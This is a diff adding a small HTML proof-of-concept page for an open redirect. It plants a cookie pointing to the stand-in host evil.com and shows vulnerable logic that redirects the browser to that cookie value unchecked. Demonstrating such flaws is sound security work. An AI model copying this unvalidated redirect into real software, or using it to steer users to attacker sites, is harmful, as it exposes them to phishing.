@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Open Redirect PoC via document.cookie</title>
+  <script>
+    // Step 1: Set a malicious cookie with redirect to attacker's site
+    document.cookie = "redirect=https://evil.com";
+
+    // Step 2: Simulate vulnerable logic on example.com
+    window.onload = function () {
+      var parts = document.cookie.split("redirect=");
+      if (parts.length > 1) {
+        var url = parts[1].split(";")[0]; // clean value
+        alert("Redirecting to: " + url);  // show where it's going
+        window.location.href = url;      // perform redirect
+      }
+    }
+  </script>
+</head>
+<body>
+  <h2>Simulated Example.com</h2>
+  <p>If this page is vulnerable, you will be redirected to <code>https://evil.com</code>.</p>
+</body>
+</html>
